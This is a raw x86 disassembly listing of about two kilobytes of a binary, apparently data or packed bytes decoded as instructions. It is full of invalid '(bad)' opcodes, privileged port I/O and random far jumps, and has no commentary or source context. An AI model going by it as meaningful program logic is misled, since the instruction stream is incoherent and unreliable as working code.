  405c0b:	fsub   DWORD PTR [ebx]
  405c0d:	std    
  405c0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c0f:	aaa    
  405c10:	test   eax,esi
  405c12:	cdq    
  405c13:	inc    edx
  405c14:	ja     0x405c33
  405c16:	leave  
  405c17:	dec    eax
  405c18:	cmc    
  405c19:	or     eax,0x54d2c2f0
  405c1e:	jno    0x405c00
  405c20:	inc    ecx
  405c21:	cmp    eax,0xb4ee9cef
  405c26:	shl    DWORD PTR [ebp-0x67],0x12
  405c2a:	dec    esp
  405c2b:	inc    ebx
  405c2c:	les    esi,FWORD PTR [ebx+edx*8-0x2e]
  405c30:	inc    edi
  405c31:	dec    eax
  405c32:	fimul  WORD PTR [ecx]
  405c34:	sbb    BYTE PTR [esp+esi*2+0x7ebb0fd7],cl
  405c3b:	sbb    al,0x46
  405c3d:	stos   DWORD PTR es:[edi],eax
  405c3e:	ds push ebp
  405c40:	push   edx
  405c41:	stos   DWORD PTR es:[edi],eax
  405c42:	(bad)  
  405c43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c44:	xchg   ebp,eax
  405c45:	adc    al,0x6e
  405c47:	leave  
  405c48:	fild   QWORD PTR [edi-0x5e]
  405c4b:	or     DWORD PTR [edi+0x65c09237],ecx
  405c51:	stos   BYTE PTR es:[edi],al
  405c52:	(bad)  [esi]
  405c54:	push   ecx
  405c55:	cmp    al,0x9a
  405c57:	mov    al,0x87
  405c59:	sbb    edx,DWORD PTR [ecx-0x7f]
  405c5c:	rol    BYTE PTR [edi+ebx*8+0x3],0x65
  405c61:	fs adc al,0xe9
  405c64:	mov    ebx,0x27407526
  405c69:	ss int3 
  405c6b:	out    dx,al
  405c6c:	fcomp  DWORD PTR [ebx+esi*1-0x24831ef4]
  405c73:	add    al,0x3f
  405c75:	sub    ecx,DWORD PTR es:[ebx+0x1a]
  405c79:	xchg   esp,eax
  405c7a:	rol    BYTE PTR [ebx-0x2173ff95],cl
  405c80:	push   edx
  405c81:	jmp    0x8444:0xe11e6cf7
  405c88:	fisttp QWORD PTR [eax+eax*4+0x6291d1f3]
  405c8f:	test   ecx,eax
  405c91:	retf   0x7620
  405c94:	inc    edi
  405c95:	sbb    al,0xee
  405c97:	aad    0x14
  405c99:	pop    ebp
  405c9a:	inc    edi
  405c9b:	jno    0x405d0a
  405c9d:	cli    
  405c9e:	fld    TBYTE PTR [esi]
  405ca0:	fmulp  st(7),st
  405ca2:	and    BYTE PTR [esi+ebp*2-0x22],cl
  405ca6:	pop    ecx
  405ca7:	out    0xae,al
  405ca9:	inc    edi
  405caa:	jecxz  0x405ccf
  405cac:	cld    
  405cad:	pop    cx
  405caf:	adc    al,0xa2
  405cb1:	cld    
  405cb2:	fadd   QWORD PTR [esi]
  405cb4:	inc    esp
  405cb5:	xor    ah,BYTE PTR [esp+eax*8]
  405cb8:	leave  
  405cb9:	jp     0x405cfb
  405cbb:	push   edx
  405cbc:	xchg   BYTE PTR [edx-0x5b],ah
  405cbf:	outs   dx,DWORD PTR ds:[esi]
  405cc0:	xor    ecx,ebp
  405cc2:	xchg   edx,eax
  405cc3:	jle    0x405c58
  405cc5:	jmp    0x7c36d11f
  405cca:	rol    esi,0x3
  405ccd:	pushf  
  405cce:	push   edi
  405ccf:	rcr    DWORD PTR [ecx],0xce
  405cd2:	iret   
  405cd3:	and    eax,0x970d0035
  405cd8:	cli    
  405cd9:	mov    bl,BYTE PTR [edi-0x90a2cdb]
  405cdf:	fild   DWORD PTR [edx-0x64ec3110]
  405ce5:	les    esi,FWORD PTR [ebx]
  405ce7:	xchg   dh,dl
  405ce9:	sbb    eax,0xfe0c3f
  405cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cef:	push   ds
  405cf0:	rol    BYTE PTR [ebp-0x98418ea],cl
  405cf6:	int    0x86
  405cf8:	push   eax
  405cf9:	cld    
  405cfa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405cfb:	add    ch,BYTE PTR [edx]
  405cfd:	(bad)  
  405cfe:	stc    
  405cff:	scas   eax,DWORD PTR es:[edi]
  405d00:	aam    0x5f
  405d02:	push   ds
  405d03:	cmp    eax,0x79461953
  405d08:	add    ch,BYTE PTR [eax]
  405d0a:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  405d0c:	shl    BYTE PTR [ebx],0xe9
  405d0f:	xchg   esp,eax
  405d10:	out    dx,al
  405d11:	sbb    ch,dl
  405d13:	adc    DWORD PTR [ebp-0x6cbe4295],0x46
  405d1a:	aas    
  405d1b:	js     0x405d15
  405d1d:	outs   dx,DWORD PTR ds:[esi]
  405d1e:	lock (bad) 
  405d20:	inc    DWORD PTR [eax]
  405d22:	je     0x405d92
  405d24:	mov    eax,0xf108af3b
  405d29:	fwait
  405d2a:	push   ebp
  405d2b:	fs jmp 0x405d0e
  405d2e:	mov    ch,BYTE PTR [ebp+0xc486911]
  405d34:	adc    dh,BYTE PTR [ebp-0xf]
  405d37:	add    eax,0x3c8d6e78
  405d3c:	ret    
  405d3d:	mov    BYTE PTR [ebp-0x6cd4c0e9],bh
  405d43:	loope  0x405d16
  405d45:	mov    edx,0x215b7fca
  405d4a:	and    BYTE PTR [ebp+0x79b9fda0],dl
  405d50:	adc    al,0x5e
  405d52:	fs pop edi
  405d54:	ins    BYTE PTR es:[edi],dx
  405d55:	sub    bh,bl
  405d57:	push   edx
  405d58:	mov    esp,0x319de8ca
  405d5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d5e:	in     al,dx
  405d5f:	ds push edi
  405d61:	sbb    DWORD PTR ds:0x2cd09ee,0x96670ea0
  405d6b:	fistp  DWORD PTR [ecx]
  405d6d:	rol    ch,0x68
  405d70:	xor    DWORD PTR [ecx-0x36fc2606],edi
  405d76:	test   eax,0xba7ac18c
  405d7b:	(bad)  
  405d7c:	cmp    al,BYTE PTR [ebp-0x7bf76f4e]
  405d82:	sbb    esi,ebx
  405d84:	into   
  405d85:	xchg   esi,eax
  405d86:	test   al,0xfc
  405d88:	pop    es
  405d89:	sbb    BYTE PTR [edx],bl
  405d8b:	pop    edx
  405d8c:	in     eax,0x9c
  405d8e:	jnp    0x405d37
  405d90:	repnz xchg esi,eax
  405d92:	(bad)  [ebx-0x2c]
  405d95:	sahf   
  405d96:	mov    BYTE PTR [eax+0x7e],bh
  405d99:	scas   eax,DWORD PTR es:[edi]
  405d9a:	mov    esp,0x9862d4ad
  405d9f:	lods   eax,DWORD PTR ds:[esi]
  405da0:	fdivp  st(3),st
  405da2:	push   esi
  405da3:	in     eax,dx
  405da4:	lea    esi,[edi+0x71eab3e4]
  405daa:	sar    DWORD PTR [ebp+0x6a],0x64
  405dae:	add    BYTE PTR ds:0xe6fb2b43,ch
  405db4:	daa    
  405db5:	sahf   
  405db6:	dec    eax
  405db7:	rcl    BYTE PTR [ebx],cl
  405db9:	jnp    0x405d7d
  405dbb:	fs jae 0x405d62
  405dbe:	pop    edi
  405dbf:	cmp    DWORD PTR [eax-0x68175d51],esp
  405dc5:	push   edi
  405dc6:	mov    ecx,0xeb162199
  405dcb:	xchg   esp,eax
  405dcc:	cmp    DWORD PTR [esi],ebx
  405dce:	sub    al,0xf3
  405dd0:	fst    QWORD PTR [edx+0x121ad34a]
  405dd6:	clc    
  405dd7:	dec    ecx
  405dd8:	div    bh
  405dda:	xchg   esp,eax
  405ddb:	or     eax,0xade1c752
  405de0:	inc    edi
  405de1:	imul   edx,DWORD PTR ds:0x75cf8193,0xffffffbb
  405de8:	dec    ebx
  405de9:	adc    al,0x19
  405deb:	jl     0x405df6
  405ded:	push   0x72f5b519
  405df2:	push   esp
  405df3:	aas    
  405df4:	jl     0x405dd1
  405df6:	sub    eax,0x34d9c4b6
  405dfb:	push   ebx
  405dfc:	inc    esi
  405dfd:	mov    ebx,0x26dd76f1
  405e02:	icebp  
  405e03:	enter  0x9535,0x7d
  405e07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e08:	cmp    bh,BYTE PTR [eax-0x3bc8d11f]
  405e0e:	mov    ds,WORD PTR [ebp-0x56bf5415]
  405e14:	gs jb  0x405e24
  405e17:	jge    0x405e7e
  405e19:	or     BYTE PTR [ebp-0x3f],bl
  405e1c:	aam    0x73
  405e1e:	and    eax,DWORD PTR [edx-0x40]
  405e21:	inc    edx
  405e22:	dec    ecx
  405e23:	pop    ecx
  405e24:	jmp    0x61633819
  405e29:	ds and eax,0x78995691
  405e2f:	sub    al,0xe7
  405e31:	je     0x405e75
  405e33:	mov    dl,0xde
  405e35:	mov    ds,WORD PTR [edx+0x58a02b3e]
  405e3b:	mov    edi,DWORD PTR [edx]
  405e3d:	aam    0x9
  405e3f:	mov    WORD PTR [esi+0x3a],fs
  405e42:	add    ch,ah
  405e44:	pusha  
  405e45:	adc    DWORD PTR [ebx+0x3a],esp
  405e48:	pop    ebx
  405e49:	test   BYTE PTR [edi+0x28],cl
  405e4c:	cmp    eax,0x383f93af
  405e51:	sbb    al,0x5d
  405e53:	cmp    BYTE PTR [eax],ch
  405e55:	in     eax,dx
  405e56:	add    BYTE PTR [edi],al
  405e58:	jle    0x405ded
  405e5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e5b:	pusha  
  405e5c:	clc    
  405e5d:	jle    0x405e46
  405e5f:	inc    edi
  405e60:	ret    0x5827
  405e63:	popa   
  405e64:	iret   
  405e65:	mov    edi,0x2601d1ca
  405e6a:	mov    dl,0x42
  405e6c:	fdivrp st(2),st
  405e6e:	and    eax,0xf0b400bb
  405e73:	(bad)  
  405e74:	fnstcw WORD PTR [edx-0x7bfaa6b1]
  405e7a:	popa   
  405e7b:	aam    0xe
  405e7d:	pop    ebx
  405e7e:	test   DWORD PTR [edx+0x21adec04],0xbf8d48b
  405e88:	fadd   QWORD PTR [eax]
  405e8a:	repz xor BYTE PTR [esi+eax*4],0xdb
  405e8f:	push   esp
  405e90:	scas   al,BYTE PTR es:[edi]
  405e91:	sbb    al,0x80
  405e93:	mov    dh,0x3d
  405e95:	cwde   
  405e96:	fmul   st(0),st
  405e98:	add    BYTE PTR [esi-0x67dc3867],ch
  405e9e:	cdq    
  405e9f:	fadd   QWORD PTR [esi]
  405ea1:	sub    ecx,DWORD PTR [ebx+edi*2+0x7a]
  405ea5:	in     eax,0x4c
  405ea7:	adc    al,0x9d
  405ea9:	pop    esi
  405eaa:	lea    ecx,[edx+0x761d7edc]
  405eb0:	dec    ebp
  405eb1:	xor    DWORD PTR [ebp-0x73],ebp
  405eb4:	call   0x4075:0x9b22b43
  405ebb:	adc    eax,esp
  405ebd:	cld    
  405ebe:	sub    DWORD PTR [ecx+ebx*8+0x3],ecx
  405ec2:	xor    eax,0x5909e4a3
  405ec7:	jb     0x405eba
  405ec9:	xchg   ecx,eax
  405eca:	mov    ds:0x4f9cd973,al
  405ecf:	in     al,0x21
  405ed1:	fs xchg esp,eax
  405ed3:	pop    ss
  405ed4:	lds    esi,FWORD PTR ds:0x6a42a901
  405eda:	sbb    BYTE PTR [edx-0x42],dh
  405edd:	push   0x7
  405edf:	add    DWORD PTR [eax-0x1f84413c],esp
  405ee5:	xor    al,0x16
  405ee7:	aam    0x60
  405ee9:	(bad)  
  405eea:	aas    
  405eeb:	cmp    DWORD PTR [edi+0x22],ebx
  405eee:	mov    al,ds:0xbf98fcaa
  405ef3:	mov    cl,BYTE PTR [eax+ebx*8-0x10a0a039]
  405efa:	adc    ebx,DWORD PTR [ecx-0x732d1f01]
  405f00:	loopne 0x405f70
  405f02:	xor    al,0x86
  405f04:	jae    0x405f52
  405f06:	pop    edi
  405f07:	push   esi
  405f08:	fisubr WORD PTR [ebx+0x60]
  405f0b:	ja     0x405efa
  405f0d:	pop    ebx
  405f0e:	lahf   
  405f0f:	xchg   ebp,eax
  405f10:	push   ecx
  405f11:	push   ds
  405f12:	mov    ebx,eax
  405f14:	in     eax,0x6c
  405f16:	dec    ebx
  405f17:	mov    esp,0x64079b73
  405f1c:	lahf   
  405f1d:	push   edx
  405f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f1f:	inc    ecx
  405f20:	imul   BYTE PTR [edi-0x5f]
  405f23:	(bad)  
  405f24:	scas   eax,DWORD PTR es:[edi]
  405f25:	in     al,0x43
  405f27:	mov    eax,0x1f2df079
  405f2c:	sbb    bl,BYTE PTR [edi]
  405f2e:	jmp    0xda57:0xda1864d1
  405f35:	or     eax,0xc7c1abf2
  405f3a:	pop    edx
  405f3b:	mov    ebp,0xc2889131
  405f40:	adc    ebx,DWORD PTR [esi+edi*8]
  405f43:	(bad)  
  405f44:	jmp    0x54f38447
  405f49:	icebp  
  405f4a:	lds    ebx,FWORD PTR [ecx+0xdb535e3]
  405f50:	loop   0x405f26
  405f52:	add    DWORD PTR [esi+0x16b28fbd],ecx
  405f58:	mov    al,ds:0x47e832d2
  405f5d:	out    dx,eax
  405f5e:	add    DWORD PTR [ebx+esi*8+0x716a60f6],edx
  405f65:	mov    bh,0x6d
  405f67:	mov    eax,ds:0xf7cc53e6
  405f6c:	cmp    eax,eax
  405f6e:	push   0x77
  405f70:	or     BYTE PTR [edx],cl
  405f72:	jmp    0x73add611
  405f77:	cwde   
  405f78:	mov    BYTE PTR [eax+0x2677cc86],bl
  405f7e:	pop    edi
  405f7f:	call   0x19a55e8c
  405f84:	jecxz  0x405fef
  405f86:	loope  0x405fe3
  405f88:	inc    edx
  405f89:	(bad)  
  405f8a:	dec    ebx
  405f8b:	fneni(8087 only) 
  405f8d:	shl    bh,1
  405f8f:	lods   eax,DWORD PTR ds:[esi]
  405f90:	mov    cl,0x3b
  405f92:	icebp  
  405f93:	and    al,0x77
  405f95:	add    edi,eax
  405f97:	and    dh,bh
  405f99:	and    bh,BYTE PTR [esi+0x4b]
  405f9c:	(bad)  
  405f9d:	xor    dh,bl
  405f9f:	stc    
  405fa0:	push   0x5c4bc338
  405fa5:	not    DWORD PTR [ecx-0x505ffbb0]
  405fab:	push   es
  405fac:	mov    ecx,0x9ec00133
  405fb1:	jns    0x405f4d
  405fb3:	cmc    
  405fb4:	inc    ebx
  405fb5:	loope  0x405f68
  405fb7:	jne    0x405f9a
  405fb9:	xor    eax,0x7345961b
  405fbe:	pop    edi
  405fbf:	pop    esp
  405fc0:	lods   al,BYTE PTR ds:[esi]
  405fc1:	add    ecx,esp
  405fc3:	mov    ah,BYTE PTR [esi-0x59ef90c6]
  405fc9:	into   
  405fca:	in     al,dx
  405fcb:	mov    ecx,0x66b5315e
  405fd0:	inc    ebx
  405fd1:	xchg   ebp,eax
  405fd2:	bound  bx,DWORD PTR [ecx+0x7d]
  405fd6:	or     al,0x56
  405fd8:	cwde   
  405fd9:	push   0x9a28b3a
  405fde:	icebp  
  405fdf:	mov    ah,0x73
  405fe2:	mov    esi,0xb1fbd68f
  405fe7:	push   0x74dd8ac3
  405fec:	push   cs
  405fed:	xor    al,0xb3
  405fef:	mov    bl,0xe7
  405ff1:	neg    ecx
  405ff3:	sub    al,0xe2
  405ff5:	xor    BYTE PTR ds:0xe3b3b063,bl
  405ffb:	adc    eax,eax
  405ffd:	loope  0x406008
  405fff:	daa    
  406000:	push   ecx
  406001:	loope  0x405fc6
  406003:	cwde   
  406004:	cli    
  406005:	xchg   ecx,eax
  406006:	xor    al,cl
  406008:	out    0xf0,al
  40600a:	mov    bl,0x91
  40600c:	xchg   edx,eax
  40600d:	mov    ds:0xe52b7bf1,al
  406012:	imul   edx,DWORD PTR [ebx-0x76adbb6c],0xffffffeb
  406019:	out    dx,al
  40601a:	dec    ebp
  40601b:	pop    ds
  40601c:	xchg   esi,eax
  40601d:	mov    bl,0x26
  40601f:	clc    
  406020:	mov    al,0x9e
  406022:	cli    
  406023:	(bad)  
  406024:	(bad)  
  406025:	outs   dx,BYTE PTR ds:[esi]
  406026:	and    BYTE PTR [edx],ah
  406028:	xor    BYTE PTR [edi+0x6f],cl
  40602b:	xchg   ebp,eax
  40602c:	pop    ebp
  40602d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40602e:	or     ah,BYTE PTR [ebx+0x63]
  406031:	cwde   
  406032:	fs push edx
  406034:	jb     0x40603c
  406036:	pop    ebx
  406037:	lahf   
  406038:	fisttp DWORD PTR [edx]
  40603a:	fdivrp st(7),st
  40603c:	pop    edx
  40603d:	fsub   QWORD PTR [ebx]
  40603f:	or     BYTE PTR [ebx],bl
  406041:	or     al,0xb4
  406043:	pop    ss
  406044:	push   0x6b
  406046:	sub    ch,BYTE PTR [eax-0x69d784b3]
  40604c:	lods   eax,DWORD PTR ds:[esi]
  40604d:	test   eax,0xdd7907d2
  406052:	jmp    0x58afd9dd
  406057:	adc    ah,al
  406059:	test   al,0x6a
  40605b:	call   0x14a3:0x8e3bd014
  406062:	add    esi,DWORD PTR [eax+0x26faf78]
  406068:	sub    BYTE PTR [eax+ecx*1],0x2
  40606c:	xchg   BYTE PTR [esi-0x7c],ah
  40606f:	xchg   esi,eax
  406070:	xor    esi,DWORD PTR [ebx+0x77]
  406073:	pop    eax
  406074:	push   esi
  406075:	rcr    BYTE PTR [ecx],cl
  406077:	loope  0x406027
  406079:	ins    DWORD PTR es:[edi],dx
  40607a:	mov    ds:0xa89e2d23,al
  40607f:	nop
  406080:	or     eax,DWORD PTR [edx+0x5a5243d7]
  406086:	cmp    eax,0xb2f0c8c0
  40608b:	test   DWORD PTR ds:0x5e8d4d51,ebx
  406091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406092:	mov    eax,0xe4d4abc4
  406097:	add    eax,0x4fa5b906
  40609c:	sub    BYTE PTR [ebx+0x42],0x5c
  4060a0:	jge    0x406073
  4060a2:	rol    BYTE PTR [esi],cl
  4060a4:	sub    DWORD PTR [ebx],edx
  4060a6:	fisubr DWORD PTR [eax-0x5d]
  4060a9:	mov    esi,0xea2f5f8f
  4060ae:	xlat   BYTE PTR ds:[ebx]
  4060af:	adc    ebx,DWORD PTR [eax+0x7f]
  4060b2:	popf   
  4060b3:	or     bl,BYTE PTR [ebx*1+0xf35b2f9]
  4060ba:	sbb    eax,0xdb7b10c3
  4060bf:	fisub  DWORD PTR [edx+0x159ad7df]
  4060c5:	fnsave [ebp+0x7529af11]
  4060cb:	mov    cs,WORD PTR [ebp-0x7d]
  4060ce:	rcl    BYTE PTR [esi],cl
  4060d0:	frstor [edi]
  4060d2:	cld    
  4060d3:	and    eax,0xf5d0a844
  4060d8:	(bad)  
  4060d9:	mov    dl,0xb1
  4060db:	das    
  4060dc:	and    BYTE PTR [edi-0x17],ch
  4060df:	(bad)  
  4060e0:	or     edx,DWORD PTR [edi-0x322beb1b]
  4060e6:	test   al,0x3f
  4060e9:	mov    eax,ds:0x96f4b0b3
  4060ee:	(bad)  
  4060ef:	hlt    
  4060f0:	push   edi
  4060f1:	push   0xaf69fe51
  4060f6:	push   ss
  4060f7:	sub    bh,dl
  4060f9:	push   ecx
  4060fa:	(bad)  
  4060fc:	mov    ch,0x34
  4060fe:	jbe    0x40613e
  406100:	nop
  406101:	lods   eax,DWORD PTR ds:[esi]
  406102:	jl     0x4060a3
  406104:	jns    0x406183
  406106:	mov    eax,ds:0x281328b9
  40610b:	push   ss
  40610c:	lock jo 0x406136
  40610f:	adc    ebp,DWORD PTR [edx]
  406111:	stos   DWORD PTR es:[edi],eax
  406112:	in     al,0xc7
  406114:	sub    eax,0x89b02b95
  406119:	jae    0x406117
  40611b:	aad    0x4a
  40611d:	mov    WORD PTR [edx-0x7e],gs
  406120:	fbstp  TBYTE PTR [esi-0x6]
  406123:	xchg   BYTE PTR [esi+esi*4-0x79],ch
  406127:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406129:	jg     0x406114
  40612b:	mov    edi,0x95081b67
  406130:	(bad)  
  406131:	jno    0x40612f
  406133:	(bad)
  406136:	mov    ds:0xfd128a95,eax
  40613b:	cmp    BYTE PTR [ecx+eax*2],bl
  40613e:	inc    esp
  40613f:	fwait
  406140:	pop    edi
  406141:	lea    esp,[edi+0x75]
  406144:	cli    
  406145:	or     al,0xeb
  406147:	pop    ss
  406148:	pop    es
  406149:	mov    ch,0x85
  40614b:	xlat   BYTE PTR ds:[ebx]
  40614c:	mov    WORD PTR fs:[edi-0xa97a351],ds
  406153:	enter  0x922c,0x35
  406157:	out    dx,al
  406158:	inc    ecx
  406159:	das    
  40615a:	pop    esi
  40615b:	scas   eax,DWORD PTR es:[edi]
  40615c:	fld    QWORD PTR [ebp-0x2a5f9033]
  406162:	std    
  406163:	and    dh,cl
  406165:	cld    
  406166:	mov    bl,0xae
  406168:	add    BYTE PTR [esi+esi*1-0x79bef21c],dh
  40616f:	push   edi
  406170:	out    0x23,al
  406172:	xchg   esi,eax
  406173:	push   es
  406174:	add    bh,ch
  406176:	mov    es,WORD PTR [edi-0x27]
  406179:	mov    dh,BYTE PTR [eax+0x30]
  40617c:	dec    esi
  40617d:	pop    es
  40617e:	sub    BYTE PTR [ebx],bl
  406180:	push   es
  406181:	push   ds
  406182:	mov    al,0x46
  406184:	pushf  
  406185:	add    eax,0x7d06fa73
  40618a:	inc    eax
  40618b:	in     eax,0x21
  40618d:	jnp    0x40612a
  40618f:	ss (bad) 
  406191:	int3   
  406192:	xchg   dh,dh
  406194:	mov    gs,WORD PTR [ecx-0x4a313b5b]
  40619a:	cmp    BYTE PTR [esp+esi*8],0xc
  40619e:	(bad)  
  40619f:	retf   
  4061a0:	mov    esp,0x65afb8c3
  4061a5:	inc    edx
  4061a6:	mov    WORD PTR [esi],?
  4061a8:	inc    ebp
  4061a9:	test   al,0x51
  4061ab:	mov    ebp,0xdcc1e655
  4061b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061b1:	int3   
  4061b2:	cwde   
  4061b3:	aas    
  4061b4:	push   0xdc3f9f3
  4061b9:	out    0x75,eax
  4061bb:	push   es
  4061bc:	lahf   
  4061bd:	pop    ds
  4061be:	xor    DWORD PTR [eax+0x4faf75fa],ebp
  4061c4:	mov    esi,ds
  4061c6:	aas    
  4061c7:	scas   al,BYTE PTR es:[edi]
  4061c8:	lea    edx,[edi]
  4061ca:	pop    ss
  4061cb:	jmp    FWORD PTR [edx-0x29]
  4061ce:	jg     0x406194
  4061d0:	jne    0x406212
  4061d2:	inc    esp
  4061d3:	aam    0xb7
  4061d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061d6:	test   al,0x7d
  4061d8:	stc    
  4061d9:	enter  0xc6c4,0xa5
  4061dd:	push   esi
  4061de:	and    BYTE PTR [ebx+0x30],cl
  4061e1:	ret    
  4061e2:	std    
  4061e3:	loopne 0x4061f3
  4061e5:	mov    WORD PTR [eax],cs
  4061e7:	shr    BYTE PTR [esi-0x78ab8b6b],0x5c
  4061ee:	pusha  
  4061ef:	jne    0x406236
  4061f1:	arpl   bx,sp
  4061f3:	(bad)  
  4061f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061f5:	ja     0x406213
  4061f7:	push   0x64e845eb
  4061fc:	repnz imul BYTE PTR [edi+0x38]
  406200:	or     eax,0xe84aabef
  406205:	stos   BYTE PTR es:[edi],al
  406206:	fwait
  406207:	xchg   esp,eax
  406208:	rcr    BYTE PTR [edi-0x7d],1
  40620b:	xor    edx,edi
  40620d:	aad    0x3
  40620f:	ror    BYTE PTR [ecx+0x42],cl
  406212:	push   0x63
  406214:	dec    edi
  406215:	iret   
  406216:	mov    ebx,0xddeac132
  40621b:	(bad)  
  40621c:	fcmovnb st,st(6)
  40621e:	pop    eax
  40621f:	shl    BYTE PTR [ecx+0x76],1
  406222:	push   es
  406223:	mov    edi,0xd6504fe0
  406228:	sbb    BYTE PTR [ebp-0x71ebec23],0x3
  40622f:	mov    ebp,0xbb2c2615
  406234:	xor    BYTE PTR [esi-0x4a8f3143],bl
  40623a:	call   0xe8fc:0x13b29a3f
  406241:	mov    bl,0x57
  406243:	xchg   ebp,eax
  406244:	pop    edx
  406245:	and    BYTE PTR [edx],cl
  406247:	std    
  406248:	or     ebx,DWORD PTR [esi-0x4c]
  40624b:	mov    ch,0x2f
  40624d:	dec    edx
  40624e:	jb     0x4061d6
  406250:	div    DWORD PTR [esi+0x51]
  406253:	and    ebp,DWORD PTR [ecx-0x29]
  406256:	(bad)  
  406257:	sahf   
  406258:	bound  ebp,QWORD PTR [ecx+eiz*2-0x5a]
  40625c:	pop    esp
  40625d:	jb     0x406277
  40625f:	gs test DWORD PTR ss:[eax-0x6b6ad055],esi
  406267:	mov    eax,ds:0x41784175
  40626c:	aad    0x8a
  40626e:	fisub  WORD PTR [ebx+0x18]
  406271:	aas    
  406272:	xlat   BYTE PTR ds:[ebx]
  406273:	mov    ebx,ecx
  406275:	mov    al,ds:0xd5c8c7eb
  40627a:	sti    
  40627b:	jne    0x4062cd
  40627d:	mov    ebp,0xb48036b0
  406282:	popa   
  406283:	fwait
  406284:	(bad)  
  406285:	call   DWORD PTR [edx-0x49]
  406288:	cmc    
  406289:	cmp    BYTE PTR [esi-0x17bc2fe7],al
  40628f:	sbb    DWORD PTR [eax+0x54],ecx
  406292:	mov    esp,0xc79633bf
  406297:	sar    DWORD PTR [eax-0x7aa5e6b6],cl
  40629d:	jmp    0x6313:0x583750fa
  4062a4:	test   DWORD PTR [ecx-0x6],ecx
  4062a7:	sub    eax,0xf657b2d0
  4062ac:	jbe    0x4062bb
  4062ae:	cdq    
  4062af:	mov    fs,WORD PTR [eax-0x6c]
  4062b2:	daa    
  4062b3:	imul   edx,ebx,0x43
  4062b6:	pop    ss
  4062b7:	rcl    BYTE PTR [ecx-0x20],1
  4062ba:	mov    esp,0x98bb1582
  4062bf:	push   0x7ae8d322
  4062c4:	les    edx,FWORD PTR [esi+0x43]
  4062c7:	add    al,0xb8
  4062c9:	cmp    cl,dh
  4062cb:	cwde   
  4062cc:	leave  
  4062cd:	xlat   BYTE PTR ds:[ebx]
  4062ce:	mov    ecx,0x84f1f29d
  4062d3:	fistp  DWORD PTR [edi+0x2c4020cd]
  4062d9:	aaa    
  4062da:	jbe    0x4062c7
  4062dc:	nop
  4062dd:	mov    esp,0xfc7bfbce
  4062e2:	and    edx,DWORD PTR [edi]
  4062e4:	sub    eax,0x7f9c0bb
  4062e9:	cwde   
  4062ea:	leave  
  4062eb:	ret    0x3cd9
  4062ee:	(bad)  
  4062ef:	fnstsw WORD PTR [edx-0x34]
  4062f2:	popf   
  4062f3:	xor    DWORD PTR [ebx],ebx
  4062f5:	aam    0xf2
  4062f7:	ins    DWORD PTR es:[edi],dx
  4062f8:	sub    dl,BYTE PTR [esi+0x453a1147]
  4062fe:	fcomi  st,st(0)
  406300:	dec    esp
  406301:	hlt    
  406302:	(bad)  
  406303:	aaa    
  406304:	and    al,0xef
  406306:	test   DWORD PTR [esp+ebx*4],esp
  406309:	call   0xe11b:0xd2d07823
  406310:	ins    BYTE PTR es:[edi],dx
  406311:	(bad)  
  406312:	imul   BYTE PTR [eax]
  406314:	fldenv [eax]
  406316:	jmp    0x6730dd54
  40631b:	cmp    edx,DWORD PTR [edx]
  40631d:	ror    BYTE PTR [edx],cl
  40631f:	push   ds
  406320:	loopne 0x406369
  406322:	cdq    
  406323:	retf   
  406324:	mov    edi,0x2781425a
  406329:	and    esi,DWORD PTR [edi-0x55]
  40632c:	addr16 adc al,0x2e
  40632f:	jecxz  0x406322
  406331:	xchg   ebx,eax
  406332:	push   es
  406333:	(bad)  
  406334:	out    0xff,eax
  406336:	aad    0xb8
  406338:	add    ch,bh
  40633a:	cld    
  40633b:	sub    esi,esi
  40633d:	nop
  40633e:	lea    ebx,[ecx]
  406340:	sbb    al,0xdd
  406342:	popf   
  406343:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406344:	les    eax,FWORD PTR [edx+esi*2+0xbfc92e1]
  40634b:	or     bh,BYTE PTR cs:[ebx+0x4c8ae51b]
  406352:	lods   al,BYTE PTR ds:[esi]
  406353:	js     0x4062ef
  406355:	nop
  406356:	inc    eax
  406357:	daa    
  406358:	pop    eax
  406359:	aam    0x58
  40635b:	adc    al,0x8b
  40635d:	pop    ss
  40635e:	sbb    al,0x39
  406360:	dec    ecx
  406361:	les    eax,FWORD PTR [ecx-0x59581068]
  406367:	sub    DWORD PTR ds:0x9970d201,ebx
  40636d:	std    
  40636e:	jnp    0x4062fc
  406370:	adc    eax,0xaeaf690
  406375:	xchg   esi,eax
  406376:	popa   
  406377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406378:	and    bh,BYTE PTR [ecx+0x14e25127]
  40637e:	jmp    0x40634b
  406380:	pop    esp
  406381:	sar    DWORD PTR [esi],1
  406383:	adc    al,al
  406385:	iret   
  406386:	shl    esp,cl
  406388:	and    BYTE PTR [eax+0x76],0xed
  40638c:	shr    DWORD PTR [ecx],0xb2
  40638f:	inc    eax
  406390:	mov    cl,0x7c
  406392:	push   ebx
  406393:	test   al,0x70
  406395:	ins    BYTE PTR es:[edi],dx
  406396:	mov    gs,WORD PTR [ecx]
  406398:	sub    DWORD PTR [ecx-0x65972c56],esp
  40639e:	xchg   ecx,eax
  40639f:	(bad)  
  4063a0:	retf   
  4063a1:	mov    ah,0x7b
  4063a3:	add    BYTE PTR [esi+0x47472c8b],bh
  4063a9:	inc    ebp
  4063aa:	fimul  WORD PTR [esi]
  4063ac:	inc    ecx
  4063ad:	adc    edx,DWORD PTR [edi]
  4063af:	sbb    ch,bl
  4063b1:	dec    esp
  4063b2:	xchg   edi,eax
  4063b3:	loopne 0x40635f
  4063b5:	mov    BYTE PTR [ebx-0x1b99b8e0],0xf4
  4063bc:	lods   eax,DWORD PTR ds:[esi]
